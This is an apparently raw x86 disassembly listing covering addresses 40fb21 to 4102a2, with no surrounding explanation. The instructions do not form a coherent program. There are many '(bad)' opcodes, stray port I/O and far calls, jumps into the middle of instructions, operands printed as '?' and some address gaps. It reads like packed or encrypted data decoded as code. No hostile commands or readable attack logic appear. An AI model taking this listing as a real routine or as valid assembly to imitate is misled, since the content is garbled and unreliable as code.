  40fb21:	int    0xb3
  40fb23:	in     al,0xa8
  40fb25:	jae    0x40fb2f
  40fb27:	test   BYTE PTR cs:[ecx+edi*4],cl
  40fb2b:	repnz push edx
  40fb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb2e:	xchg   esp,eax
  40fb2f:	ins    DWORD PTR es:[edi],dx
  40fb30:	stc    
  40fb31:	jl     0x40fb38
  40fb33:	mov    al,0xab
  40fb35:	jl     0x40fb6f
  40fb37:	jl     0x40faeb
  40fb39:	clc    
  40fb3a:	push   eax
  40fb3b:	mov    ch,0x33
  40fb3d:	stos   BYTE PTR es:[edi],al
  40fb3e:	push   cs
  40fb3f:	xchg   edx,eax
  40fb40:	mov    dl,0x76
  40fb42:	pop    eax
  40fb43:	mov    bl,cl
  40fb45:	ins    BYTE PTR es:[edi],dx
  40fb46:	xchg   al,ch
  40fb48:	xor    al,0xf
  40fb4a:	or     eax,0x39f88d7b
  40fb4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb50:	lods   al,BYTE PTR ds:[esi]
  40fb51:	dec    esp
  40fb52:	mov    ebp,0xa636b227
  40fb57:	test   dl,ch
  40fb59:	mov    bh,0xc6
  40fb5b:	jne    0x40fb8a
  40fb5d:	mov    ah,0x25
  40fb5f:	std    
  40fb60:	lods   eax,DWORD PTR ds:[esi]
  40fb61:	je     0x40fb6a
  40fb63:	dec    eax
  40fb64:	jno    0x40fae7
  40fb66:	nop
  40fb67:	cmp    al,0x28
  40fb69:	xor    ebp,edx
  40fb6b:	xchg   edi,eax
  40fb6c:	xor    DWORD PTR [ecx],edx
  40fb6e:	daa    
  40fb6f:	mov    edi,eax
  40fb71:	add    al,0xd2
  40fb73:	add    edi,DWORD PTR [ebx-0x775597e]
  40fb79:	scas   eax,DWORD PTR es:[edi]
  40fb7a:	stc    
  40fb7b:	(bad)  
  40fb7c:	ss ret 0x7054
  40fb80:	pusha  
  40fb81:	add    al,0x3c
  40fb83:	sbb    dl,BYTE PTR [edx-0x60f616c5]
  40fb89:	popa   
  40fb8a:	inc    ebx
  40fb8b:	cmp    al,0xd8
  40fb8d:	and    ebp,0xc3dc3856
  40fb93:	(bad)  
  40fb94:	adc    bl,BYTE PTR fs:[esi+eiz*2+0x1bd44cf3]
  40fb9c:	aad    0x50
  40fb9e:	push   ss
  40fb9f:	lock (bad) 
  40fba1:	iret   
  40fba2:	push   ds
  40fba3:	pop    ss
  40fba4:	fdivr  DWORD PTR [ebp-0x1f]
  40fba7:	push   eax
  40fba8:	mov    ds:0x21ddf60e,al
  40fbad:	lds    esi,FWORD PTR [ebp+0x3dc03939]
  40fbb3:	test   al,0x46
  40fbb5:	in     al,0xa4
  40fbb7:	push   edx
  40fbb8:	sub    ch,bl
  40fbba:	ins    BYTE PTR es:[edi],dx
  40fbbb:	sbb    ch,BYTE PTR [edi+0x78]
  40fbbe:	dec    esp
  40fbbf:	popf   
  40fbc0:	scas   eax,DWORD PTR es:[edi]
  40fbc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc2:	xchg   esp,eax
  40fbc3:	les    eax,FWORD PTR [ebx+0x3507a97b]
  40fbc9:	dec    esp
  40fbca:	dec    eax
  40fbcb:	aad    0xc
  40fbcd:	and    al,0x2e
  40fbcf:	scas   eax,DWORD PTR es:[edi]
  40fbd0:	inc    eax
  40fbd1:	mov    esp,0x9ca512fa
  40fbd6:	fidivr DWORD PTR [ebp+0x5281a193]
  40fbdc:	loop   0x40fbcc
  40fbde:	or     bl,BYTE PTR [ecx+0x2d]
  40fbe1:	mov    al,0x94
  40fbe3:	mov    ebx,0x7537fbf0
  40fbe8:	icebp  
  40fbe9:	call   0x8a11:0x73e23576
  40fbf0:	fistp  DWORD PTR [ebx]
  40fbf2:	dec    ebx
  40fbf3:	cdq    
  40fbf4:	mov    eax,0x7dd70244
  40fbf9:	mov    esi,0x7d168dd2
  40fbfe:	mov    ecx,0x27ae0a7a
  40fc03:	stc    
  40fc04:	xchg   edx,eax
  40fc05:	and    eax,0x7a39096b
  40fc0a:	mov    al,bh
  40fc0c:	lock es fdivp st(7),st
  40fc10:	push   edx
  40fc11:	popa   
  40fc12:	jnp    0x40fc13
  40fc14:	push   esi
  40fc15:	out    0xdb,al
  40fc17:	pushf  
  40fc18:	(bad)  
  40fc19:	mov    ebp,0xe5a607c4
  40fc1e:	add    ecx,0x8671249e
  40fc24:	retf   
  40fc25:	adc    al,0x3b
  40fc27:	fstp   TBYTE PTR [esi]
  40fc29:	hlt    
  40fc2a:	popf   
  40fc2b:	dec    edx
  40fc2c:	push   esp
  40fc2d:	es mov ecx,0x3bf97e1f
  40fc33:	cli    
  40fc34:	enter  0x7ee8,0xc1
  40fc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc39:	mov    dh,0xfb
  40fc3b:	ds es mov ah,0xfe
  40fc3f:	push   ebx
  40fc40:	sahf   
  40fc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc42:	das    
  40fc43:	fst    DWORD PTR [esi+eax*1+0x16b8d97f]
  40fc4a:	cdq    
  40fc4b:	cmp    DWORD PTR [ecx-0x3f5d354],0xac284652
  40fc55:	mov    ?,WORD PTR ds:0x3f4f8311
  40fc5b:	inc    ecx
  40fc5c:	mov    cx,0x304b
  40fc60:	pop    edx
  40fc61:	mov    edi,gs
  40fc63:	in     eax,dx
  40fc64:	mov    ch,0xc6
  40fc66:	add    eax,0x82852711
  40fc6b:	cld    
  40fc6c:	fild   QWORD PTR [ebx-0x42]
  40fc6f:	out    0xa5,al
  40fc71:	sub    al,0x92
  40fc73:	daa    
  40fc74:	ja     0x40fcc1
  40fc76:	mov    eax,0x8b9930b7
  40fc7b:	sub    ebx,DWORD PTR [eax+eiz*1+0x4be472c]
  40fc82:	loopne 0x40fca9
  40fc84:	data16 and BYTE PTR [ebx-0x52],al
  40fc88:	cs stc 
  40fc8a:	in     al,0x53
  40fc8c:	mov    eax,ds:0xf180d74c
  40fc91:	and    BYTE PTR [ebp-0x77],bh
  40fc94:	jmp    0x40fcf5
  40fc96:	dec    ebx
  40fc97:	mov    ds:0xb45186c5,eax
  40fc9c:	dec    esp
  40fc9d:	push   esp
  40fc9e:	mov    DWORD PTR [edi+0x3],edi
  40fca1:	ins    BYTE PTR es:[edi],dx
  40fca2:	inc    edx
  40fca3:	fnstenv [ecx+0x3c68ae0]
  40fca9:	add    eax,0x2db1efbf
  40fcae:	push   0x9469a6a8
  40fcb3:	adc    al,BYTE PTR [ebp+0x1882d738]
  40fcb9:	stos   BYTE PTR es:[edi],al
  40fcba:	(bad)  
  40fcbb:	cmp    eax,0x630b5346
  40fcc0:	shl    DWORD PTR [ebp+0xc],cl
  40fcc3:	shr    BYTE PTR [esi+edx*1+0x3e],1
  40fcc7:	jno    0x40fcf8
  40fcc9:	xchg   BYTE PTR [edi],ch
  40fccb:	or     BYTE PTR [esi+0x1f850e16],bl
  40fcd1:	jae    0x40fca8
  40fcd3:	mov    esp,0x8bf9451f
  40fcd8:	imul   cl
  40fcda:	sbb    DWORD PTR [edi+0x1],ebp
  40fcdd:	rol    BYTE PTR [ebp-0x3269c008],1
  40fce3:	scas   eax,DWORD PTR es:[edi]
  40fce4:	shl    BYTE PTR fs:[ecx+0x4b],0xe1
  40fce9:	aas    
  40fcea:	xchg   DWORD PTR [eax],esp
  40fcec:	pop    ebp
  40fced:	repnz (bad) 
  40fcef:	push   ebx
  40fcf0:	xor    esp,esp
  40fcf2:	pushf  
  40fcf3:	jno    0x40fd25
  40fcf5:	push   ebp
  40fcf6:	stos   BYTE PTR es:[edi],al
  40fcf7:	vdivps xmm0,xmm0,xmm2
  40fcfb:	fst    st(1)
  40fcfd:	loopne 0x40fcb7
  40fcff:	mov    ds:0xae446696,eax
  40fd04:	xchg   edi,eax
  40fd05:	pushf  
  40fd06:	cwde   
  40fd07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd08:	pushf  
  40fd09:	es ret 0x77df
  40fd0d:	mov    eax,ds:0x4c1a27ed
  40fd12:	and    DWORD PTR [ebp+0x23df7248],ebx
  40fd18:	jne    0x40fd8e
  40fd1a:	xor    dh,bl
  40fd1c:	icebp  
  40fd1d:	mov    WORD PTR [edx],?
  40fd1f:	lea    eax,[ebx+0xf6a4515]
  40fd25:	inc    ebp
  40fd26:	lahf   
  40fd27:	fisub  DWORD PTR [ecx+0x729b1529]
  40fd2d:	mov    ch,0x6e
  40fd2f:	ret    0x2e89
  40fd32:	add    ebx,ebx
  40fd34:	hlt    
  40fd35:	scas   al,BYTE PTR es:[edi]
  40fd36:	sti    
  40fd37:	push   ss
  40fd38:	shr    al,0x4c
  40fd3b:	jnp    0x40fd01
  40fd3d:	push   edx
  40fd3e:	js     0x40fd60
  40fd40:	cmp    ch,bh
  40fd42:	cld    
  40fd43:	mov    esp,0xb391c25f
  40fd48:	jecxz  0x40fd90
  40fd4a:	dec    edi
  40fd4b:	push   ds
  40fd4c:	mov    bl,0x77
  40fd4e:	or     al,0x4a
  40fd50:	inc    esp
  40fd51:	jg     0x40fdb6
  40fd53:	push   esp
  40fd54:	out    0xb1,eax
  40fd56:	clc    
  40fd57:	neg    DWORD PTR [eax]
  40fd59:	sub    esp,esi
  40fd5b:	mov    al,al
  40fd5d:	stc    
  40fd5e:	mov    ?,ebp
  40fd60:	ins    DWORD PTR es:[edi],dx
  40fd61:	add    bl,cl
  40fd63:	mov    ah,BYTE PTR [esi]
  40fd65:	dec    eax
  40fd66:	int3   
  40fd67:	test   al,0xc6
  40fd69:	pop    edi
  40fd6a:	outs   dx,BYTE PTR ds:[esi]
  40fd6b:	enter  0xa760,0xaf
  40fd6f:	and    eax,0xe745e63
  40fd74:	add    dh,BYTE PTR [esi]
  40fd76:	cdq    
  40fd77:	ins    DWORD PTR es:[edi],dx
  40fd78:	test   DWORD PTR [ebp+0x7a],esi
  40fd7b:	pop    edx
  40fd7c:	mov    ah,0xb9
  40fd7e:	push   ebp
  40fd7f:	inc    eax
  40fd80:	scas   eax,DWORD PTR es:[edi]
  40fd81:	gs push ss
  40fd83:	rcr    BYTE PTR ss:[edi-0x3228aed0],0xe2
  40fd8b:	push   ecx
  40fd8c:	mov    al,0x41
  40fd8e:	arpl   WORD PTR [ecx+0x33c1ca8],cx
  40fd94:	and    eax,0xdabc3572
  40fd99:	add    ch,bl
  40fd9b:	in     al,dx
  40fd9c:	inc    ebx
  40fd9d:	iret   
  40fd9e:	arpl   WORD PTR ds:0x58e291b0,bp
  40fda4:	aam    0xcb
  40fda6:	push   ds
  40fda7:	cmc    
  40fda8:	pop    es
  40fda9:	cli    
  40fdaa:	mov    dh,0x85
  40fdac:	daa    
  40fdad:	mov    edx,0x45506560
  40fdb2:	mov    ah,0xd0
  40fdb4:	fisttp DWORD PTR [esi+0x370cdc31]
  40fdbb:	mov    al,ds:0x3b0561c
  40fdc0:	dec    ebx
  40fdc1:	dec    ebx
  40fdc2:	mov    DWORD PTR [ecx+edi*8-0x5c1224da],ecx
  40fdc9:	mov    ebx,0xc98527e2
  40fdce:	push   eax
  40fdcf:	jg     0x40fe50
  40fdd1:	sbb    eax,0xea157b38
  40fdd6:	inc    ebx
  40fdd7:	add    ch,dh
  40fdd9:	add    DWORD PTR [edx-0x2206d37c],ebp
  40fddf:	in     al,0x30
  40fde1:	outs   dx,BYTE PTR ds:[esi]
  40fde2:	push   edi
  40fde3:	fwait
  40fde4:	jb     0x40fe58
  40fde6:	shr    BYTE PTR [esi+0x24],0x69
  40fdea:	test   eax,0x5f1daab
  40fdef:	sti    
  40fdf0:	call   0x308b5196
  40fdf5:	enter  0xacc6,0x22
  40fdf9:	sub    edi,DWORD PTR [esi-0x456e77f1]
  40fdff:	(bad)  
  40fe00:	xchg   esp,eax
  40fe01:	ss loop 0x40fdd8
  40fe04:	adc    edi,edi
  40fe06:	lahf   
  40fe07:	fdivr  DWORD PTR [ecx+ebp*4]
  40fe0a:	fadd   st(1),st
  40fe0c:	mov    al,ds:0xc975ce6
  40fe11:	pop    ebx
  40fe12:	lahf   
  40fe13:	lods   eax,DWORD PTR ds:[esi]
  40fe14:	hlt    
  40fe15:	retf   
  40fe16:	(bad)  
  40fe17:	sbb    ch,BYTE PTR [esp+ebx*8]
  40fe1a:	stc    
  40fe1b:	pop    edi
  40fe1c:	outs   dx,BYTE PTR ds:[esi]
  40fe1d:	xor    eax,0x7c4d4b10
  40fe22:	mov    ebp,0x1d50b2aa
  40fe27:	or     DWORD PTR [ecx+edi*4+0x33],ebx
  40fe2b:	inc    ebp
  40fe2c:	aad    0x75
  40fe2e:	leave  
  40fe2f:	test   dl,0x6b
  40fe32:	mov    eax,0xa3106668
  40fe37:	daa    
  40fe38:	and    BYTE PTR [ebp-0x334db7dd],ch
  40fe3e:	sub    al,0xd5
  40fe40:	ds das 
  40fe42:	ds mov esp,0x6cc13a55
  40fe48:	imul   esi,DWORD PTR [esp+ebx*8],0x1d
  40fe4c:	les    esi,FWORD PTR [esi-0x383ebd3c]
  40fe52:	adc    dh,bl
  40fe54:	inc    esp
  40fe55:	cmp    al,0xaf
  40fe57:	mov    DWORD PTR [ebp+edi*8+0x76],edx
  40fe5b:	mov    ebp,DWORD PTR [eax]
  40fe5d:	ja     0x40fe3a
  40fe5f:	bound  ebp,QWORD PTR [eax-0x51]
  40fe62:	adc    esp,DWORD PTR [edi]
  40fe64:	dec    ecx
  40fe65:	outs   dx,DWORD PTR ds:[esi]
  40fe66:	into   
  40fe67:	ret    
  40fe68:	lods   eax,DWORD PTR ds:[esi]
  40fe69:	inc    ecx
  40fe6a:	(bad)  
  40fe6b:	outs   dx,DWORD PTR ds:[esi]
  40fe6c:	pusha  
  40fe6d:	frstor [eax+esi*8]
  40fe70:	sub    DWORD PTR [ecx+ecx*2],0x8e2931d6
  40fe77:	push   ecx
  40fe78:	lock sbb al,0x8a
  40fe7b:	mov    ch,0x66
  40fe7d:	jb     0x40fedb
  40fe7f:	mov    ?,eax
  40fe81:	adc    eax,0x66487edd
  40fe86:	mov    edx,0xf1e07b2d
  40fe8b:	arpl   sp,si
  40fe8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8e:	fcom   QWORD PTR [esi+0x1e4cc069]
  40fe94:	fist   DWORD PTR [ebx]
  40fe96:	test   al,0xc8
  40fe98:	cmp    edi,DWORD PTR [eax-0x60391b39]
  40fe9e:	mov    BYTE PTR [edi],dl
  40fea0:	outs   dx,DWORD PTR ds:[esi]
  40fea1:	(bad)  
  40fea2:	in     al,dx
  40fea3:	pop    eax
  40fea4:	ins    BYTE PTR es:[edi],dx
  40fea5:	ret    0xe289
  40fea8:	and    DWORD PTR [ecx-0x72],ebx
  40feab:	or     DWORD PTR [eax+0x5],0x6faea10d
  40feb2:	mov    ds:0x314fbed,eax
  40feb7:	add    DWORD PTR [edx-0x7a5f306c],esi
  40febd:	imul   ebx,DWORD PTR [esi+0x75a0d6d6],0xffffffcc
  40fec4:	data16 stc 
  40fec6:	xor    cl,al
  40fec8:	inc    esi
  40fec9:	out    dx,eax
  40feca:	fsub   DWORD PTR [eax-0x7f]
  40fecd:	push   cs
  40fece:	xor    al,0x44
  40fed0:	sub    eax,0xd12bed0a
  40fed5:	lds    edi,FWORD PTR [edi-0x53]
  40fed8:	or     eax,0x6a401c7
  40fedd:	add    DWORD PTR [ebx+edi*1-0x66],esp
  40fee1:	fisttp DWORD PTR [eax+0x1c3d9174]
  40fee7:	mov    ds:0xdb4e0fba,eax
  40feec:	lods   eax,DWORD PTR ds:[esi]
  40feed:	es or  eax,ebp
  40fef0:	(bad)  
  40fef1:	jns    0x40fe9c
  40fef3:	lahf   
  40fef4:	pop    edx
  40fef5:	pop    ebp
  40fef6:	retf   0x3733
  40fef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fefa:	mov    cl,0xf8
  40fefc:	inc    esp
  40fefd:	cmp    esp,DWORD PTR [ebx+0x7442c376]
  40ff03:	lahf   
  40ff04:	add    BYTE PTR [ebx],bl
  40ff06:	inc    ecx
  40ff07:	(bad)  
  40ff08:	aas    
  40ff09:	je     0x40ff58
  40ff0b:	repnz shr DWORD PTR [edx],1
  40ff0e:	es clc 
  40ff10:	shl    BYTE PTR [edi+0x22542df5],1
  40ff16:	dec    esp
  40ff17:	and    ecx,DWORD PTR [edi+eiz*2]
  40ff1a:	jnp    0x40ff11
  40ff1c:	cli    
  40ff1d:	jne    0x40ff95
  40ff1f:	dec    ebx
  40ff20:	scas   al,BYTE PTR es:[edi]
  40ff21:	mov    ecx,0x67e1195d
  40ff26:	shr    BYTE PTR [edi+0x5fe08fc8],0x75
  40ff2d:	mov    al,ds:0x31a4efb5
  40ff32:	into   
  40ff33:	lock xchg ah,bh
  40ff36:	(bad)  
  40ff37:	mov    eax,ds:0xf7840935
  40ff3c:	adc    DWORD PTR [ebp+0x4a],esp
  40ff3f:	cwde   
  40ff40:	xchg   esp,eax
  40ff41:	jle    0x40ff84
  40ff43:	jns    0x40ff4e
  40ff45:	pop    edx
  40ff46:	lahf   
  40ff47:	cwde   
  40ff48:	mov    ch,0x16
  40ff4a:	and    al,BYTE PTR [ebx]
  40ff4c:	sahf   
  40ff4d:	cmp    DWORD PTR [ebx-0x69415701],0x17
  40ff54:	popf   
  40ff55:	retf   
  40ff56:	inc    esp
  40ff57:	call   0xcba4:0xc9ef79e1
  40ff5e:	shr    BYTE PTR [esi-0x26],cl
  40ff61:	popf   
  40ff62:	cwde   
  40ff63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff64:	jl     0x40ffba
  40ff66:	psrlq  mm4,QWORD PTR [edi+edi*4-0x4]
  40ff6b:	adc    BYTE PTR [ebp-0x1cb069ed],dl
  40ff71:	aaa    
  40ff72:	(bad)  
  40ff73:	fisttp WORD PTR [esi+0x75]
  40ff76:	add    eax,0x830545a2
  40ff7b:	(bad)  
  40ff7d:	je     0x40ffc7
  40ff7f:	push   edi
  40ff80:	pushw  ss
  40ff82:	or     al,0x6f
  40ff84:	fdiv   QWORD PTR [eax+0x1b]
  40ff87:	popw   ss
  40ff89:	dec    ecx
  40ff8a:	imul   eax,DWORD PTR [esi+0x17be9ed9],0x793360e5
  40ff94:	jb     0x40ffa0
  40ff96:	or     eax,0xd95018ba
  40ff9b:	mov    ecx,0xef4cc4a2
  40ffa0:	push   eax
  40ffa1:	ror    BYTE PTR [esi],0xa2
  40ffa4:	push   ecx
  40ffa5:	pop    edx
  40ffa6:	sub    BYTE PTR [esi-0x472418c],0xd1
  40ffad:	mov    ah,dl
  40ffaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffb0:	adc    eax,0x929e2494
  40ffb5:	test   eax,0x4a1b1e72
  40ffba:	out    dx,eax
  40ffbb:	sar    BYTE PTR [ebx],0x3d
  40ffbe:	jbe    0x41000f
  40ffc0:	inc    ecx
  40ffc1:	inc    ebp
  40ffc2:	rcl    DWORD PTR [ecx+0x420e1c63],1
  40ffc8:	shr    DWORD PTR [edx-0x6c],cl
  40ffcb:	stos   DWORD PTR es:[edi],eax
  40ffcc:	inc    eax
  40ffcd:	mov    al,ds:0xf37c86eb
  40ffd2:	push   ds
  40ffd3:	cmc    
  40ffd4:	fdiv   DWORD PTR [esi+0x79]
  40ffd7:	aas    
  40ffd8:	scas   eax,DWORD PTR es:[edi]
  40ffd9:	mov    fs,WORD PTR [ebx]
  40ffdb:	call   0xbb5342d1
  40ffe0:	mov    eax,0x6081c334
  40ffe5:	dec    ecx
  40ffe6:	(bad)  
  40ffe7:	fwait
  40ffe8:	jno    0x40ffdf
  40ffea:	cmp    dh,ch
  40ffec:	ss push edx
  40ffee:	cld    
  40ffef:	push   esp
  40fff0:	sub    al,0x40
  40fff2:	jle    0x40fffb
  40fff4:	jl     0x410057
  40fff6:	cli    
  40fff7:	add    BYTE PTR [esi+edx*8],ch
  40fffa:	and    al,0x17
  40fffc:	aaa    
  40fffd:	cmp    BYTE PTR [edi],ah
  40ffff:	cdq    
  410000:	xchg   ebx,eax
  410001:	call   esi
  410003:	test   eax,0x71602b8d
  410008:	aas    
  410009:	add    eax,DWORD PTR ds:0x70402416
  41000f:	gs push ds
  410011:	xor    DWORD PTR [esi],edx
  410013:	mov    WORD PTR [edi+0x480a9803],fs
  410019:	cmovae esp,esp
  41001c:	add    al,0x7
  41001e:	xchg   edi,eax
  41001f:	cmp    DWORD PTR [ecx-0x26079fc7],ebx
  410025:	dec    edx
  410026:	cwde   
  410027:	(bad)  
  410028:	(bad)  
  410029:	cmc    
  41002a:	inc    eax
  41002b:	push   ecx
  41002c:	mov    es,WORD PTR [eax]
  41002e:	jmp    0x5e70956c
  410033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410034:	mov    DWORD PTR [ebx],0x7d469076
  41003a:	jmp    0x16f1de07
  41003f:	inc    edi
  410040:	mov    esp,0x7afc26cf
  410045:	out    0x91,al
  410047:	xchg   edi,eax
  410048:	ret    0x38f9
  41004b:	ins    DWORD PTR es:[edi],dx
  41004c:	(bad)  
  41004d:	mov    esi,0x6e98d25d
  410052:	mov    eax,ds:0x7ccb1f82
  410057:	pusha  
  410058:	xchg   ebx,ecx
  41005a:	hlt    
  41005b:	sar    BYTE PTR [edx+0x3c],1
  41005e:	push   esp
  41005f:	shl    edi,cl
  410061:	push   es
  410062:	nop
  410063:	das    
  410064:	call   0xf17c:0x2c3f5922
  41006b:	imul   ecx,edx,0x1e
  41006e:	dec    eax
  41006f:	ss push 0x2d
  410072:	dec    edi
  410073:	dec    ecx
  410074:	sbb    eax,0x8889d228
  410079:	xchg   ebp,eax
  41007a:	dec    esp
  41007b:	sbb    dh,BYTE PTR ds:0x9f273e02
  410081:	mov    esp,0xe6c2f687
  410086:	mov    esp,0xbbcf4473
  41008b:	adc    eax,0x505a6683
  410090:	sub    al,0x23
  410092:	or     esp,edx
  410094:	mov    ch,0x1d
  410096:	inc    esi
  410097:	cmp    al,0x6a
  410099:	cmp    cl,BYTE PTR [edi+ebp*2-0x51]
  41009d:	sub    BYTE PTR [esi+0x709055e8],0x4b
  4100a4:	arpl   WORD PTR [ecx],ax
  4100a6:	adc    BYTE PTR [esi],al
  4100a8:	or     ch,bh
  4100aa:	and    eax,0xcc9f8a3f
  4100af:	pop    ds
  4100b0:	pusha  
  4100b1:	les    edx,FWORD PTR [edi-0x13]
  4100b4:	xor    edx,eax
  4100b6:	mov    ch,0x31
  4100b8:	pop    ds
  4100b9:	mov    eax,ds:0x5a35f968
  4100be:	add    al,al
  4100c0:	cmp    DWORD PTR [ebp+0x35],0x70415cd3
  4100c7:	and    DWORD PTR [ecx+esi*1],ebx
  4100ca:	jmp    0x2aa:0xd10500ce
  4100d1:	cdq    
  4100d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100d3:	pop    es
  4100d4:	jg     0x410146
  4100d6:	outs   dx,DWORD PTR ds:[esi]
  4100d7:	cmp    al,0x39
  4100d9:	jno    0x4100be
  4100db:	fs pop edi
  4100dd:	pop    ecx
  4100de:	das    
  4100df:	add    al,0x6b
  4100e1:	lea    edx,[edi+eax*2]
  4100e4:	cmc    
  4100e5:	stc    
  4100e6:	(bad)  
  4100e7:	not    BYTE PTR [edx-0x6]
  4100ea:	test   bh,cl
  4100ec:	(bad)  
  4100ee:	mov    ebp,0x2c2bae5b
  4100f3:	mov    ds:0x547308f7,eax
  4100f8:	inc    ecx
  4100f9:	pop    es
  4100fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100fb:	adc    edi,edx
  4100fd:	jno    0x410124
  4100ff:	lods   eax,DWORD PTR ds:[esi]
  410100:	cmp    DWORD PTR [edx-0xa589a6e],0xffffffe6
  410107:	or     eax,0xde708331
  41010c:	inc    ecx
  41010d:	into   
  41010e:	frstor [ebx-0x70fa19c4]
  410114:	mov    edi,0x2485eb71
  410119:	les    ebp,FWORD PTR [esi+0x1d]
  41011c:	inc    ebx
  41011d:	inc    eax
  41011e:	xchg   BYTE PTR [esi],dl
  410120:	div    BYTE PTR [edi+0x76075f23]
  410126:	dec    esp
  410127:	push   cs
  410128:	pushf  
  410129:	jmp    0x1e81:0xb2b71709
  410130:	loope  0x410142
  410132:	adc    al,0xa5
  410134:	xor    DWORD PTR [edx-0xa],eax
  410137:	stos   BYTE PTR es:[edi],al
  410138:	pop    ds
  410139:	mov    ebx,0x86cd33c3
  41013e:	test   al,0x3
  410140:	test   DWORD PTR [ebx+ecx*2+0x6e],esi
  410144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410145:	sti    
  410146:	mov    al,0x3f
  410148:	lock arpl WORD PTR [esi+0x4aca4740],dx
  41014f:	fimul  DWORD PTR [ecx+eiz*2+0x57]
  410153:	xor    esp,DWORD PTR [ebx-0x6e1dc80f]
  410159:	cmp    eax,0x616ec914
  41015e:	pushf  
  41015f:	ds sbb eax,0xc3559775
  410165:	ds sbb eax,0xab43c117
  41016b:	jmp    0xf940570c
  410170:	jmp    0x74f7a2
  410175:	das    
  410176:	sbb    BYTE PTR [ebx],0xaf
  410179:	fs aad 0x3d
  41017c:	int    0xc8
  41017e:	lods   al,BYTE PTR ds:[esi]
  41017f:	inc    edi
  410180:	push   eax
  410181:	xchg   ebp,eax
  410182:	shl    edx,cl
  410184:	or     edx,eax
  410186:	retf   
  410187:	(bad)  
  410188:	popa   
  410189:	add    ch,0x12
  41018c:	mov    cl,al
  41018e:	test   DWORD PTR [edi+0x52abbe16],edx
  410194:	aaa    
  410195:	out    dx,al
  410196:	add    dl,BYTE PTR [ecx]
  410198:	mov    ds:0x663de8df,eax
  41019d:	mov    ebp,0xaeb7ca6d
  4101a2:	or     eax,DWORD PTR [ebx-0x1b2c9914]
  4101a8:	mov    al,ds:0xbfe7efe9
  4101ad:	(bad)
  4101b0:	(bad)  
  4101b1:	gs scas eax,DWORD PTR es:[edi]
  4101b3:	fstp   TBYTE PTR [ecx]
  4101b5:	dec    edx
  4101b6:	into   
  4101b7:	mov    cl,0xda
  4101b9:	sti    
  4101ba:	aaa    
  4101bb:	pop    DWORD PTR [edx]
  4101bd:	data16 in al,dx
  4101bf:	jnp    0x4101ff
  4101c1:	das    
  4101c2:	inc    ebx
  4101c3:	aam    0xe9
  4101c5:	sahf   
  4101c6:	jmp    0x4101a7
  4101c8:	pusha  
  4101c9:	push   eax
  4101ca:	sub    DWORD PTR [eax],ebx
  4101cc:	inc    edx
  4101cd:	(bad)  
  4101ce:	frstor [ecx-0x56]
  4101d1:	mov    dl,BYTE PTR [eax-0x4b]
  4101d4:	into   
  4101d5:	cwde   
  4101d6:	dec    esi
  4101d7:	mov    edx,0xa5016480
  4101dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101dd:	ror    ebp,1
  4101df:	mov    eax,0xe52dee8b
  4101e4:	adc    eax,0x136bf1ff
  4101e9:	iret   
  4101ea:	sbb    al,0xd6
  4101ec:	fild   DWORD PTR fs:[edx+0x63]
  4101f0:	jecxz  0x4101fe
  4101f2:	rol    esp,1
  4101f4:	dec    ecx
  4101f5:	imul   ecx,DWORD PTR [edi],0x52bc17f6
  4101fb:	cmc    
  4101fc:	jle    0x410237
  4101fe:	fstp   QWORD PTR [eax-0x1e]
  410201:	in     eax,0x30
  410203:	in     al,dx
  410204:	xchg   esp,eax
  410205:	or     dh,dh
  410207:	std    
  410208:	xchg   esi,eax
  410209:	je     0x41027a
  41020b:	popf   
  41020c:	test   DWORD PTR [edx-0x13],ebx
  41020f:	enter  0x391a,0x4e
  410213:	mov    ds:0xf6228d8c,eax
  410218:	shl    DWORD PTR [ebx],cl
  41021a:	in     al,0x8b
  41021c:	mov    al,ds:0x9fe7e658
  410221:	outs   dx,BYTE PTR ds:[esi]
  410222:	pop    esi
  410223:	mov    ss,WORD PTR gs:[esi-0xc]
  410227:	jmp    DWORD PTR [ebp+0x5c]
  41022a:	push   es
  41022b:	or     eax,0xdbf90bd4
  410230:	leave  
  410231:	mov    ds,WORD PTR [ebx]
  410233:	push   es
  410234:	fcmove st,st(1)
  410236:	and    DWORD PTR [ebx-0x6d],ebx
  410239:	(bad)  
  41023a:	fisub  WORD PTR [ebx-0x223df39d]
  410240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410241:	cmp    BYTE PTR [eax+0x38],0x25
  410245:	xchg   BYTE PTR [edx-0x11],dl
  410248:	lds    ebp,FWORD PTR [edx+0xee868c2]
  41024e:	loope  0x4102a1
  410250:	(bad)  [edi]
  410252:	sub    DWORD PTR [esi+0x197f8f74],ecx
  410258:	or     bh,BYTE PTR [edi-0x9afa14b]
  41025e:	sbb    BYTE PTR [esi+0x787f15de],0xff
  410265:	mov    ebp,0x71e54c64
  41026a:	iret   
  41026b:	(bad)  [edi-0x72]
  41026e:	idiv   BYTE PTR [ecx+0x50]
  410271:	ds mov esi,0x828d401b
  410277:	call   DWORD PTR [eax]
  410279:	push   0x4120ba1a
  41027e:	mov    dl,0xbc
  410280:	lods   eax,DWORD PTR ds:[esi]
  410281:	(bad)  
  410282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410283:	push   edi
  410285:	cwde   
  410286:	int    0xc9
  410288:	retf   0x3792
  41028b:	xchg   edx,eax
  41028c:	mov    esi,0x40ee0a58
  410291:	xlat   BYTE PTR ds:[ebx]
  410292:	pop    esp
  410293:	ds enter 0xf727,0xb5
  410298:	repz loop 0x4102e2
  41029b:	fucomi st,st(2)
  41029d:	data16 xor bl,BYTE PTR [esi]
  4102a0:	nop
  4102a1:	inc    esi
  4102a2:	sbb    al,0x22
